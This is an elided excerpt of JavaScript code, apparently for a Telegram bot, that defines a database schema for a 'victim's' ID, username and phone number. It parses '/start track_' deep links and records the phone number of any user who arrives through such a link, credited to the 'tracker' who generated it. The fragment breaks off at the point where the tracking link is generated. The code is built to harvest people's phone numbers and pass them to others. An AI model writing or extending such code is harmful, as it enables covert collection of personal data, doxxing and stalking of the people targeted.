...
// New schema for storing tracked phone numbers
const TrackedPhoneSchema = new mongoose.Schema({
  botToken: { type: String, required: true },
  victimId: { type: String, required: true }, // ID of the user who shared their contact
  victimUsername: { type: String }, // Username of the user who shared their contact
  phoneNumber: { type: String, required: true }, // Phone number shared by the victim
  trackerId: { type: String, required: true }, // ID of the user who generated the tracking link
  createdAt: { type: Number, default: () => Math.floor(Date.now() / 1000) },
});
  ...
  try {
    ...
    if (update.message?.text?.startsWith('/start')) {
      ...
      if (startParam.startsWith('track_')) {
        const trackerId = startParam.replace('track_', '');
        if (/^\d+$/.test(trackerId)) {
          isTrackingLink = true;
          referralOwnerId = trackerId;
        }
      }
    }
      ...
      if (text?.startsWith('/start')) {
        ...
        if (isTrackingLink && referralOwnerId) {
          try {
            ...
            await TrackedPhone.create({
              botToken,
              victimId: userId,
              victimUsername: username,
              phoneNumber,
              trackerId: referralOwnerId,
            });
    ...
    if (update.callback_query) {
      ...
      if (callbackData === 'lang_en') {
        ...
        try {
          // Generate the tracking link using the user's ID
